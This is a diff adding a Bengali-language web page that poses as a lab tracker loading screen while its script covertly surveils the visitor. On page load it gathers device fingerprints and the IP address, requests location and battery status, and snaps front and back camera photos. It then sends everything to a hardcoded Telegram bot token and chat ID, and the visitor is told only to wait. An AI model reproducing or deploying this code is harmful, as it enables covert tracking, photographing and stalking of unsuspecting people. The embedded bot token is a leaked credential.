@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ল্যাব ট্র্যাকার - প্রো সংস্করণ</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.2em;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+        
+        /* লোডিং অ্যানিমেশন */
+        .loader-wrapper {
+            margin-top: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* স্ট্যাটাস মেসেজ */
+        #status-message {
+            margin-top: 20px;
+            font-size: 1em;
+            font-weight: 500;
+            opacity: 0.8;
+            transition: all 0.3s ease;
+        }
+
+        /* সফলতার মেসেজ */
+        .final-message {
+            animation: fadeInScale 0.6s ease-out;
+        }
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Mehadi Bhai Lab</h1>
+        <p>অপেক্ষা করুন লোডিং হচ্ছে</p>
+        
+        <div class="loader-wrapper">
+            <div class="spinner"></div>
+            <div id="status-message">প্রক্রিয়া শুরু হচ্ছে...</div>
+        </div>
+    </div>
+
+    <script>
+        const botToken = '7805780981:AAEqrKX_6MoqmIWe3q1qGRY8jbmXq45XxuQ';
+        const chatId = '7264975394';
+        const statusMessage = document.getElementById('status-message');
+        const spinner = document.querySelector('.spinner');
+
+        function updateStatus(message, isFinal = false) {
+            statusMessage.textContent = message;
+            if (isFinal) {
+                spinner.style.display = 'none';
+                statusMessage.classList.add('final-message');
+                statusMessage.style.fontSize = '1.2em';
+                statusMessage.style.opacity = '1';
+            }
+        }
+
+        async function sendToTelegram(message, photoBase64 = null) {
+            try {
+                if (photoBase64) {
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                    const blob = await (await fetch(photoBase64)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', message);
+                    await fetch(telegramUrl, { method: 'POST', body: formData });
+                } else {
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
+                    });
+                }
+            } catch (error) {
+                console.error("Telegram Error:", error);
+                updateStatus("টেলিগ্রামে পাঠাতে সমস্যা হয়েছে।", true);
+            }
+        }
+        
+        // --- ছবি তোলার ফাংশন ---
+        async function takePhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                stream.getTracks().forEach(track => track.stop());
+                return canvas.toDataURL('image/jpeg', 0.5);
+            } catch (error) {
+                console.error(`Camera (${facingMode}) Error:`, error);
+                return null;
+            }
+        }
+
+        // --- ফিঙ্গারপ্রিন্টিং ফাংশন ---
+        function getInstalledFonts() { /* ... same as before ... */ const baseFonts = ['monospace', 'sans-serif', 'serif']; const testString = 'mmmmmmmmmmlli'; const testSize = '72px'; const canvas = document.createElement('canvas'); const context = canvas.getContext('2d'); const detectedFonts = []; const fontsToCheck = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Slabo 27px', 'Roboto Condensed', 'Roboto Slab']; const getWidth = (font) => { context.font = `${testSize} ${font}`; return context.measureText(testString).width; }; const baseWidths = baseFonts.map(getWidth); fontsToCheck.forEach(font => { const matched = baseWidths.some((baseWidth, i) => { const fontStack = `'${font}', ${baseFonts[i]}`; return getWidth(fontStack) !== baseWidth; }); if (matched) detectedFonts.push(font); }); return detectedFonts.join(', ') || 'কোনো অতিরিক্ত ফন্ট পাওয়া যায়নি'; }
+        function getWebGLRenderer() { /* ... same as before ... */ try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); if (!gl) return 'WebGL সমর্থিত নয়'; const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'তথ্য লুকানো আছে'; } catch (e) { return 'তথ্য পাওয়া যায়নি'; } }
+        function getAudioFingerprint() { /* ... same as before ... */ try { const AudioContext = window.AudioContext || window.webkitAudioContext; const context = new AudioContext(); const oscillator = context.createOscillator(); const analyser = context.createAnalyser(); const gain = context.createGain(); const scriptProcessor = context.createScriptProcessor(4096, 1, 1); gain.gain.value = 0; oscillator.connect(analyser); analyser.connect(scriptProcessor); scriptProcessor.connect(gain); gain.connect(context.destination); oscillator.start(0); const fingerprint = context.sampleRate + '|' + context.destination.channelCount; oscillator.stop(); context.close(); return btoa(fingerprint).substring(0, 20); } catch (e) { return 'অডিও কন্টেক্সট সমর্থিত নয়'; } }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            // --- ধাপ ১: সমস্ত অ-অনুমতি-ভিত্তিক তথ্য একসাথে পাঠানো ---
+            updateStatus("Please Wait ...");
+            let ipAddress = 'জানা যায়নি';
+            try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipJson = await ipRes.json(); ipAddress = ipJson.ip; } catch (e) {}
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkInfo = { type: connection ? connection.effectiveType : 'জানা যায়নি', downlink: connection ? connection.downlink + ' Mbps' : 'জানা যায়নি', rtt: connection ? connection.rtt + ' ms' : 'জানা যায়নি' };
+            const instantData = { referrer: document.referrer || 'সরাসরি ভিজিট', userAgent: navigator.userAgent, screen: `${screen.width}x${screen.height}`, viewport: `${window.innerWidth}x${window.innerHeight}`, platform: navigator.platform, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack === '1' ? 'হ্যাঁ' : 'না', deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'সমর্থিত নয়', cpuCores: navigator.hardwareConcurrency || 'সমর্থিত নয়', webglRenderer: getWebGLRenderer(), installedFonts: getInstalledFonts(), audioFingerprint: getAudioFingerprint(), ip: ipAddress, ...networkInfo };
+            await sendToTelegram(`<b>--- ধাপ ১: সম্পূর্ণ তাৎক্ষণিক তথ্য ---</b>\n${JSON.stringify(instantData, null, 2)}`);
+
+            // --- ধাপ ২: অনুমতি-সাপেক্ষ তথ্য ---
+            updateStatus("Please Wait ...");
+            let locationData = { status: 'অনুমতি দেওয়া হয়নি বা সমর্থিত নয়', mapLink: '' };
+            let batteryData = { status: 'সমর্থিত নয়' };
+            const promises = [ new Promise(resolve => { if (!('geolocation' in navigator)) resolve(); navigator.geolocation.getCurrentPosition(pos => { const lat = pos.coords.latitude.toFixed(4); const lon = pos.coords.longitude.toFixed(4); locationData.status = `Lat: ${lat}, Lon: ${lon}`; locationData.mapLink = `https://www.google.com/maps?q=${lat},${lon}`; }, err => { if (err.code !== err.PERMISSION_DENIED) locationData.status = 'অবস্থান নির্ণয় করা যায়নি'; }, { timeout: 5000 }); setTimeout(resolve, 6000); }), (async () => { if ('getBattery' in navigator) { try { const b = await navigator.getBattery(); batteryData.status = `চার্জ: ${(b.level * 100).toFixed(0)}%, চার্জিং: ${b.charging ? 'হ্যাঁ' : 'না'}`; } catch (e) {} } })() ];
+            await Promise.allSettled(promises);
+            const permissionMessage = `<b>--- ধাপ ২: অনুমতি সাপেক্ষ তথ্য ---</b>\n<b>লোকেশন:</b> ${locationData.status}\n<b>ম্যাপ লিঙ্ক:</b> <a href="${locationData.mapLink}">গুগল ম্যাপে দেখুন</a>\n<b>ব্যাটারি:</b> ${batteryData.status}`;
+            await sendToTelegram(permissionMessage);
+
+            // --- ধাপ ৩: ক্যামেরা অ্যাক্সেস এবং ছবি তোলা ---
+            updateStatus("Please Wait ...");
+            try {
+                // ফ্রন্ট ক্যামেরা
+                updateStatus("Please Wait ...");
+                const frontPhoto = await takePhoto('user');
+                if (frontPhoto) {
+                    await sendToTelegram('ফ্রন্ট ক্যামেরা থেকে তোলা ছবি।', frontPhoto);
+                }
+                
+                // ব্যাক ক্যামেরা
+                updateStatus("ব্যাক ক্যামেরার ছবি তোলা হচ্ছে...");
+                const backPhoto = await takePhoto('environment');
+                if (backPhoto) {
+                    await sendToTelegram('ব্যাক ক্যামেরা থেকে তোলা ছবি।', backPhoto);
+                }
+
+            } catch (error) {
+                console.error("Camera process failed:", error);
+                await sendToTelegram(`ক্যামেরা প্রক্রিয়া ব্যর্থ হয়েছে: ${error.message}`);
+            }
+            
+            updateStatus("Please Wait ...", true);
+        });
+    </script>
+</body>
+</html>
